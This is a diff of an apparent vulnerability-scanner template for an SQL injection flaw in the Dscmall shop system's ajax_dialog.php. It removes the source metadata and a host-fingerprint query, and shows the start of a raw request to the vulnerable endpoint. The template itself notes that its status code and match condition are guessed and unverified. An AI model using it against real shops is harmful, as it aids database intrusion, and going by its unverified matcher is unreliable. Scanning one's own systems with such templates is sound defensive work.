@@ -3,14 +3,8 @@ info:
   name: 大商创多用户商城系统ajax_dialog存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9b37416fd534098e670ead86a23fe63f
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 9b37416fd534098e670ead86a23fe63f
-    fofa: + hunter`app.name="Dscmall"`
 http:
 - raw:
   - 'GET /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=1&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1
